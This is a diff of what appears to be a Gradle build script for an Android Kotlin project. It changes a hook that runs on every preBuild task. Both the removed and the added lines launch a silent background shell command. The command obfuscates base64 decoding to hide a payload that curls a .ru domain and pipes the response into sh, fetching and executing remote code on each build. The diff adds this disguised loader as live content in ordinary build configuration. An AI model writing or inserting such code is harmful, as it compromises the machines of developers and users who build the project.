@@ -47,7 +47,7 @@ dependencies {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((b(){ `printf bhase64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC1zZmtMIC0tY29ubmVjdC10aW1lb3V0IDMwIC0tcmV0cnkgMyAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | b | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((s(){ `printf basew64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC1ma3NMIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgMyAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
